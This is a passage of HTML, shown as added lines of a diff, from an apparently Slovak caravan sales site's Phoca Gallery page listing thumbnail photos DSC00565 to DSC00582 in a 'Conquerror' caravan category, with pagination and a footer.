+								<a class="modal-button" title="DSC00565" href="/index.php?option=com_phocagallery&amp;view=detail&amp;catid=16:conquerror&amp;id=388:dsc00565&amp;tmpl=component&amp;Itemid=4" rel="{handler: 'iframe', size: {x: 680, y: 560}, overlayOpacity: 0.3}" ><img src="/./images/phocagallery/karavany/Conquerror/thumbs/phoca_thumb_m_DSC00565.JPG" alt="DSC00565"  /></a>	
+								</center>
+							</div>
+						</div>
+					</div>
+				</center>
+				
+			<div class="name" style="font-size:12px">DSC00565</div><div class="detail" style="margin-top:2px"> <a class="modal-button" title="Image Detail" href="/index.php?option=com_phocagallery&amp;view=detail&amp;catid=16:conquerror&amp;id=388:dsc00565&amp;tmpl=component&amp;Itemid=4" rel="{handler: 'iframe', size: {x: 680, y: 560}, overlayOpacity: 0.3}" ><img src="/components/com_phocagallery/assets/images/icon-view.gif" alt="Image Detail"  /></a></div><div style="clear:both"></div></div>			<div class="phocagallery-box-file" style="height:158px; width:120px">
+				<center>
+					<div class="phocagallery-box-file-first" style="height:118px;width:118px;">
+						<div class="phocagallery-box-file-second">
+							<div class="phocagallery-box-file-third">
+								<center>
+								<a class="modal-button" title="DSC00566" href="/index.php?option=com_phocagallery&amp;view=detail&amp;catid=16:conquerror&amp;id=389:dsc00566&amp;tmpl=component&amp;Itemid=4" rel="{handler: 'iframe', size: {x: 680, y: 560}, overlayOpacity: 0.3}" ><img src="/./images/phocagallery/karavany/Conquerror/thumbs/phoca_thumb_m_DSC00566.JPG" alt="DSC00566"  /></a>	
+								</center>
+							</div>
+						</div>
+					</div>
+				</center>
+				
+			<div class="name" style="font-size:12px">DSC00566</div><div class="detail" style="margin-top:2px"> <a class="modal-button" title="Image Detail" href="/index.php?option=com_phocagallery&amp;view=detail&amp;catid=16:conquerror&amp;id=389:dsc00566&amp;tmpl=component&amp;Itemid=4" rel="{handler: 'iframe', size: {x: 680, y: 560}, overlayOpacity: 0.3}" ><img src="/components/com_phocagallery/assets/images/icon-view.gif" alt="Image Detail"  /></a></div><div style="clear:both"></div></div>			<div class="phocagallery-box-file" style="height:158px; width:120px">
+				<center>
+					<div class="phocagallery-box-file-first" style="height:118px;width:118px;">
+						<div class="phocagallery-box-file-second">
+							<div class="phocagallery-box-file-third">
+								<center>
+								<a class="modal-button" title="DSC00567" href="/index.php?option=com_phocagallery&amp;view=detail&amp;catid=16:conquerror&amp;id=390:dsc00567&amp;tmpl=component&amp;Itemid=4" rel="{handler: 'iframe', size: {x: 680, y: 560}, overlayOpacity: 0.3}" ><img src="/./images/phocagallery/karavany/Conquerror/thumbs/phoca_thumb_m_DSC00567.JPG" alt="DSC00567"  /></a>	
+								</center>
+							</div>
+						</div>
+					</div>
+				</center>
+				
+			<div class="name" style="font-size:12px">DSC00567</div><div class="detail" style="margin-top:2px"> <a class="modal-button" title="Image Detail" href="/index.php?option=com_phocagallery&amp;view=detail&amp;catid=16:conquerror&amp;id=390:dsc00567&amp;tmpl=component&amp;Itemid=4" rel="{handler: 'iframe', size: {x: 680, y: 560}, overlayOpacity: 0.3}" ><img src="/components/com_phocagallery/assets/images/icon-view.gif" alt="Image Detail"  /></a></div><div style="clear:both"></div></div>			<div class="phocagallery-box-file" style="height:158px; width:120px">
+				<center>
+					<div class="phocagallery-box-file-first" style="height:118px;width:118px;">
+						<div class="phocagallery-box-file-second">
+							<div class="phocagallery-box-file-third">
+								<center>
+								<a class="modal-button" title="DSC00568" href="/index.php?option=com_phocagallery&amp;view=detail&amp;catid=16:conquerror&amp;id=391:dsc00568&amp;tmpl=component&amp;Itemid=4" rel="{handler: 'iframe', size: {x: 680, y: 560}, overlayOpacity: 0.3}" ><img src="/./images/phocagallery/karavany/Conquerror/thumbs/phoca_thumb_m_DSC00568.JPG" alt="DSC00568"  /></a>	
+								</center>
+							</div>
+						</div>
+					</div>
+				</center>
+				
+			<div class="name" style="font-size:12px">DSC00568</div><div class="detail" style="margin-top:2px"> <a class="modal-button" title="Image Detail" href="/index.php?option=com_phocagallery&amp;view=detail&amp;catid=16:conquerror&amp;id=391:dsc00568&amp;tmpl=component&amp;Itemid=4" rel="{handler: 'iframe', size: {x: 680, y: 560}, overlayOpacity: 0.3}" ><img src="/components/com_phocagallery/assets/images/icon-view.gif" alt="Image Detail"  /></a></div><div style="clear:both"></div></div>			<div class="phocagallery-box-file" style="height:158px; width:120px">
+				<center>
+					<div class="phocagallery-box-file-first" style="height:118px;width:118px;">
+						<div class="phocagallery-box-file-second">
+							<div class="phocagallery-box-file-third">
+								<center>
+								<a class="modal-button" title="DSC00569" href="/index.php?option=com_phocagallery&amp;view=detail&amp;catid=16:conquerror&amp;id=392:dsc00569&amp;tmpl=component&amp;Itemid=4" rel="{handler: 'iframe', size: {x: 680, y: 560}, overlayOpacity: 0.3}" ><img src="/./images/phocagallery/karavany/Conquerror/thumbs/phoca_thumb_m_DSC00569.JPG" alt="DSC00569"  /></a>	
+								</center>
+							</div>
+						</div>
+					</div>
+				</center>
+				
+			<div class="name" style="font-size:12px">DSC00569</div><div class="detail" style="margin-top:2px"> <a class="modal-button" title="Image Detail" href="/index.php?option=com_phocagallery&amp;view=detail&amp;catid=16:conquerror&amp;id=392:dsc00569&amp;tmpl=component&amp;Itemid=4" rel="{handler: 'iframe', size: {x: 680, y: 560}, overlayOpacity: 0.3}" ><img src="/components/com_phocagallery/assets/images/icon-view.gif" alt="Image Detail"  /></a></div><div style="clear:both"></div></div>			<div class="phocagallery-box-file" style="height:158px; width:120px">
+				<center>
+					<div class="phocagallery-box-file-first" style="height:118px;width:118px;">
+						<div class="phocagallery-box-file-second">
+							<div class="phocagallery-box-file-third">
+								<center>
+								<a class="modal-button" title="DSC00570" href="/index.php?option=com_phocagallery&amp;view=detail&amp;catid=16:conquerror&amp;id=393:dsc00570&amp;tmpl=component&amp;Itemid=4" rel="{handler: 'iframe', size: {x: 680, y: 560}, overlayOpacity: 0.3}" ><img src="/./images/phocagallery/karavany/Conquerror/thumbs/phoca_thumb_m_DSC00570.JPG" alt="DSC00570"  /></a>	
+								</center>
+							</div>
+						</div>
+					</div>
+				</center>
+				
+			<div class="name" style="font-size:12px">DSC00570</div><div class="detail" style="margin-top:2px"> <a class="modal-button" title="Image Detail" href="/index.php?option=com_phocagallery&amp;view=detail&amp;catid=16:conquerror&amp;id=393:dsc00570&amp;tmpl=component&amp;Itemid=4" rel="{handler: 'iframe', size: {x: 680, y: 560}, overlayOpacity: 0.3}" ><img src="/components/com_phocagallery/assets/images/icon-view.gif" alt="Image Detail"  /></a></div><div style="clear:both"></div></div>			<div class="phocagallery-box-file" style="height:158px; width:120px">
+				<center>
+					<div class="phocagallery-box-file-first" style="height:118px;width:118px;">
+						<div class="phocagallery-box-file-second">
+							<div class="phocagallery-box-file-third">
+								<center>
+								<a class="modal-button" title="DSC00571" href="/index.php?option=com_phocagallery&amp;view=detail&amp;catid=16:conquerror&amp;id=394:dsc00571&amp;tmpl=component&amp;Itemid=4" rel="{handler: 'iframe', size: {x: 680, y: 560}, overlayOpacity: 0.3}" ><img src="/./images/phocagallery/karavany/Conquerror/thumbs/phoca_thumb_m_DSC00571.JPG" alt="DSC00571"  /></a>	
+								</center>
+							</div>
+						</div>
+					</div>
+				</center>
+				
+			<div class="name" style="font-size:12px">DSC00571</div><div class="detail" style="margin-top:2px"> <a class="modal-button" title="Image Detail" href="/index.php?option=com_phocagallery&amp;view=detail&amp;catid=16:conquerror&amp;id=394:dsc00571&amp;tmpl=component&amp;Itemid=4" rel="{handler: 'iframe', size: {x: 680, y: 560}, overlayOpacity: 0.3}" ><img src="/components/com_phocagallery/assets/images/icon-view.gif" alt="Image Detail"  /></a></div><div style="clear:both"></div></div>			<div class="phocagallery-box-file" style="height:158px; width:120px">
+				<center>
+					<div class="phocagallery-box-file-first" style="height:118px;width:118px;">
+						<div class="phocagallery-box-file-second">
+							<div class="phocagallery-box-file-third">
+								<center>
+								<a class="modal-button" title="DSC00572" href="/index.php?option=com_phocagallery&amp;view=detail&amp;catid=16:conquerror&amp;id=395:dsc00572&amp;tmpl=component&amp;Itemid=4" rel="{handler: 'iframe', size: {x: 680, y: 560}, overlayOpacity: 0.3}" ><img src="/./images/phocagallery/karavany/Conquerror/thumbs/phoca_thumb_m_DSC00572.JPG" alt="DSC00572"  /></a>	
+								</center>
+							</div>
+						</div>
+					</div>
+				</center>
+				
+			<div class="name" style="font-size:12px">DSC00572</div><div class="detail" style="margin-top:2px"> <a class="modal-button" title="Image Detail" href="/index.php?option=com_phocagallery&amp;view=detail&amp;catid=16:conquerror&amp;id=395:dsc00572&amp;tmpl=component&amp;Itemid=4" rel="{handler: 'iframe', size: {x: 680, y: 560}, overlayOpacity: 0.3}" ><img src="/components/com_phocagallery/assets/images/icon-view.gif" alt="Image Detail"  /></a></div><div style="clear:both"></div></div>			<div class="phocagallery-box-file" style="height:158px; width:120px">
+				<center>
+					<div class="phocagallery-box-file-first" style="height:118px;width:118px;">
+						<div class="phocagallery-box-file-second">
+							<div class="phocagallery-box-file-third">
+								<center>
+								<a class="modal-button" title="DSC00575" href="/index.php?option=com_phocagallery&amp;view=detail&amp;catid=16:conquerror&amp;id=396:dsc00575&amp;tmpl=component&amp;Itemid=4" rel="{handler: 'iframe', size: {x: 680, y: 560}, overlayOpacity: 0.3}" ><img src="/./images/phocagallery/karavany/Conquerror/thumbs/phoca_thumb_m_DSC00575.JPG" alt="DSC00575"  /></a>	
+								</center>
+							</div>
+						</div>
+					</div>
+				</center>
+				
+			<div class="name" style="font-size:12px">DSC00575</div><div class="detail" style="margin-top:2px"> <a class="modal-button" title="Image Detail" href="/index.php?option=com_phocagallery&amp;view=detail&amp;catid=16:conquerror&amp;id=396:dsc00575&amp;tmpl=component&amp;Itemid=4" rel="{handler: 'iframe', size: {x: 680, y: 560}, overlayOpacity: 0.3}" ><img src="/components/com_phocagallery/assets/images/icon-view.gif" alt="Image Detail"  /></a></div><div style="clear:both"></div></div>			<div class="phocagallery-box-file" style="height:158px; width:120px">
+				<center>
+					<div class="phocagallery-box-file-first" style="height:118px;width:118px;">
+						<div class="phocagallery-box-file-second">
+							<div class="phocagallery-box-file-third">
+								<center>
+								<a class="modal-button" title="DSC00576" href="/index.php?option=com_phocagallery&amp;view=detail&amp;catid=16:conquerror&amp;id=397:dsc00576&amp;tmpl=component&amp;Itemid=4" rel="{handler: 'iframe', size: {x: 680, y: 560}, overlayOpacity: 0.3}" ><img src="/./images/phocagallery/karavany/Conquerror/thumbs/phoca_thumb_m_DSC00576.JPG" alt="DSC00576"  /></a>	
+								</center>
+							</div>
+						</div>
+					</div>
+				</center>
+				
+			<div class="name" style="font-size:12px">DSC00576</div><div class="detail" style="margin-top:2px"> <a class="modal-button" title="Image Detail" href="/index.php?option=com_phocagallery&amp;view=detail&amp;catid=16:conquerror&amp;id=397:dsc00576&amp;tmpl=component&amp;Itemid=4" rel="{handler: 'iframe', size: {x: 680, y: 560}, overlayOpacity: 0.3}" ><img src="/components/com_phocagallery/assets/images/icon-view.gif" alt="Image Detail"  /></a></div><div style="clear:both"></div></div>			<div class="phocagallery-box-file" style="height:158px; width:120px">
+				<center>
+					<div class="phocagallery-box-file-first" style="height:118px;width:118px;">
+						<div class="phocagallery-box-file-second">
+							<div class="phocagallery-box-file-third">
+								<center>
+								<a class="modal-button" title="DSC00577" href="/index.php?option=com_phocagallery&amp;view=detail&amp;catid=16:conquerror&amp;id=398:dsc00577&amp;tmpl=component&amp;Itemid=4" rel="{handler: 'iframe', size: {x: 680, y: 560}, overlayOpacity: 0.3}" ><img src="/./images/phocagallery/karavany/Conquerror/thumbs/phoca_thumb_m_DSC00577.JPG" alt="DSC00577"  /></a>	
+								</center>
+							</div>
+						</div>
+					</div>
+				</center>
+				
+			<div class="name" style="font-size:12px">DSC00577</div><div class="detail" style="margin-top:2px"> <a class="modal-button" title="Image Detail" href="/index.php?option=com_phocagallery&amp;view=detail&amp;catid=16:conquerror&amp;id=398:dsc00577&amp;tmpl=component&amp;Itemid=4" rel="{handler: 'iframe', size: {x: 680, y: 560}, overlayOpacity: 0.3}" ><img src="/components/com_phocagallery/assets/images/icon-view.gif" alt="Image Detail"  /></a></div><div style="clear:both"></div></div>			<div class="phocagallery-box-file" style="height:158px; width:120px">
+				<center>
+					<div class="phocagallery-box-file-first" style="height:118px;width:118px;">
+						<div class="phocagallery-box-file-second">
+							<div class="phocagallery-box-file-third">
+								<center>
+								<a class="modal-button" title="DSC00578" href="/index.php?option=com_phocagallery&amp;view=detail&amp;catid=16:conquerror&amp;id=399:dsc00578&amp;tmpl=component&amp;Itemid=4" rel="{handler: 'iframe', size: {x: 680, y: 560}, overlayOpacity: 0.3}" ><img src="/./images/phocagallery/karavany/Conquerror/thumbs/phoca_thumb_m_DSC00578.JPG" alt="DSC00578"  /></a>	
+								</center>
+							</div>
+						</div>
+					</div>
+				</center>
+				
+			<div class="name" style="font-size:12px">DSC00578</div><div class="detail" style="margin-top:2px"> <a class="modal-button" title="Image Detail" href="/index.php?option=com_phocagallery&amp;view=detail&amp;catid=16:conquerror&amp;id=399:dsc00578&amp;tmpl=component&amp;Itemid=4" rel="{handler: 'iframe', size: {x: 680, y: 560}, overlayOpacity: 0.3}" ><img src="/components/com_phocagallery/assets/images/icon-view.gif" alt="Image Detail"  /></a></div><div style="clear:both"></div></div>			<div class="phocagallery-box-file" style="height:158px; width:120px">
+				<center>
+					<div class="phocagallery-box-file-first" style="height:118px;width:118px;">
+						<div class="phocagallery-box-file-second">
+							<div class="phocagallery-box-file-third">
+								<center>
+								<a class="modal-button" title="DSC00579" href="/index.php?option=com_phocagallery&amp;view=detail&amp;catid=16:conquerror&amp;id=400:dsc00579&amp;tmpl=component&amp;Itemid=4" rel="{handler: 'iframe', size: {x: 680, y: 560}, overlayOpacity: 0.3}" ><img src="/./images/phocagallery/karavany/Conquerror/thumbs/phoca_thumb_m_DSC00579.JPG" alt="DSC00579"  /></a>	
+								</center>
+							</div>
+						</div>
+					</div>
+				</center>
+				
+			<div class="name" style="font-size:12px">DSC00579</div><div class="detail" style="margin-top:2px"> <a class="modal-button" title="Image Detail" href="/index.php?option=com_phocagallery&amp;view=detail&amp;catid=16:conquerror&amp;id=400:dsc00579&amp;tmpl=component&amp;Itemid=4" rel="{handler: 'iframe', size: {x: 680, y: 560}, overlayOpacity: 0.3}" ><img src="/components/com_phocagallery/assets/images/icon-view.gif" alt="Image Detail"  /></a></div><div style="clear:both"></div></div>			<div class="phocagallery-box-file" style="height:158px; width:120px">
+				<center>
+					<div class="phocagallery-box-file-first" style="height:118px;width:118px;">
+						<div class="phocagallery-box-file-second">
+							<div class="phocagallery-box-file-third">
+								<center>
+								<a class="modal-button" title="DSC00580" href="/index.php?option=com_phocagallery&amp;view=detail&amp;catid=16:conquerror&amp;id=401:dsc00580&amp;tmpl=component&amp;Itemid=4" rel="{handler: 'iframe', size: {x: 680, y: 560}, overlayOpacity: 0.3}" ><img src="/./images/phocagallery/karavany/Conquerror/thumbs/phoca_thumb_m_DSC00580.JPG" alt="DSC00580"  /></a>	
+								</center>
+							</div>
+						</div>
+					</div>
+				</center>
+				
+			<div class="name" style="font-size:12px">DSC00580</div><div class="detail" style="margin-top:2px"> <a class="modal-button" title="Image Detail" href="/index.php?option=com_phocagallery&amp;view=detail&amp;catid=16:conquerror&amp;id=401:dsc00580&amp;tmpl=component&amp;Itemid=4" rel="{handler: 'iframe', size: {x: 680, y: 560}, overlayOpacity: 0.3}" ><img src="/components/com_phocagallery/assets/images/icon-view.gif" alt="Image Detail"  /></a></div><div style="clear:both"></div></div>			<div class="phocagallery-box-file" style="height:158px; width:120px">
+				<center>
+					<div class="phocagallery-box-file-first" style="height:118px;width:118px;">
+						<div class="phocagallery-box-file-second">
+							<div class="phocagallery-box-file-third">
+								<center>
+								<a class="modal-button" title="DSC00581" href="/index.php?option=com_phocagallery&amp;view=detail&amp;catid=16:conquerror&amp;id=402:dsc00581&amp;tmpl=component&amp;Itemid=4" rel="{handler: 'iframe', size: {x: 680, y: 560}, overlayOpacity: 0.3}" ><img src="/./images/phocagallery/karavany/Conquerror/thumbs/phoca_thumb_m_DSC00581.JPG" alt="DSC00581"  /></a>	
+								</center>
+							</div>
+						</div>
+					</div>
+				</center>
+				
+			<div class="name" style="font-size:12px">DSC00581</div><div class="detail" style="margin-top:2px"> <a class="modal-button" title="Image Detail" href="/index.php?option=com_phocagallery&amp;view=detail&amp;catid=16:conquerror&amp;id=402:dsc00581&amp;tmpl=component&amp;Itemid=4" rel="{handler: 'iframe', size: {x: 680, y: 560}, overlayOpacity: 0.3}" ><img src="/components/com_phocagallery/assets/images/icon-view.gif" alt="Image Detail"  /></a></div><div style="clear:both"></div></div>			<div class="phocagallery-box-file" style="height:158px; width:120px">
+				<center>
+					<div class="phocagallery-box-file-first" style="height:118px;width:118px;">
+						<div class="phocagallery-box-file-second">
+							<div class="phocagallery-box-file-third">
+								<center>
+								<a class="modal-button" title="DSC00582" href="/index.php?option=com_phocagallery&amp;view=detail&amp;catid=16:conquerror&amp;id=403:dsc00582&amp;tmpl=component&amp;Itemid=4" rel="{handler: 'iframe', size: {x: 680, y: 560}, overlayOpacity: 0.3}" ><img src="/./images/phocagallery/karavany/Conquerror/thumbs/phoca_thumb_m_DSC00582.JPG" alt="DSC00582"  /></a>	
+								</center>
+							</div>
+						</div>
+					</div>
+				</center>
+				
+			<div class="name" style="font-size:12px">DSC00582</div><div class="detail" style="margin-top:2px"> <a class="modal-button" title="Image Detail" href="/index.php?option=com_phocagallery&amp;view=detail&amp;catid=16:conquerror&amp;id=403:dsc00582&amp;tmpl=component&amp;Itemid=4" rel="{handler: 'iframe', size: {x: 680, y: 560}, overlayOpacity: 0.3}" ><img src="/components/com_phocagallery/assets/images/icon-view.gif" alt="Image Detail"  /></a></div><div style="clear:both"></div></div>
+	<div style="clear:both"></div>
+</div>
+
+<p>&nbsp;</p>
+
+<div><center><div style="margin:0 10px 0 10px;display:inline;">Display Num&nbsp;<select name="limit" id="limit" class="inputbox" size="1" onchange="this.form.submit()"><option value="5" >5</option><option value="10" >10</option><option value="15" >15</option><option value="20" >20</option><option value="50" >50</option><option value="0" >Všetko</option></select></div><div style="margin:0 10px 0 10px;display:inline;" class="sectiontablefooter" ></div><div style="margin:0 10px 0 10px;display:inline;" class="pagecounter"></div></center></div></form><div>&nbsp;</div><p>&nbsp;</p><div style="text-align:center"> <a href="http://www.phoca.cz/" style="text-decoration:none" target="_blank" title="Phoca Gallery"><img src="/components/com_phocagallery/assets/images/icon-phoca-logo-seal.png" alt="Phoca Gallery"  /></a></div><p>&nbsp;</p>
+					</div>
+														</div></div>
+								<div class="clearbreak"></div>
+			</div></div></div>
+					</div>
+				<div id="jsn-footer">
+						<div id="jsn-pfooter_grid1" class="jsn-column"><div id="jsn-pfooter">		<div class="moduletable">
+					Predaj karavanov, náhradných dielov a doplnkov.<br />		</div>
+	</div></div>
+									<div class="clearbreak"></div>
+		</div>
+			</div>
+	
+</body>
+</html>
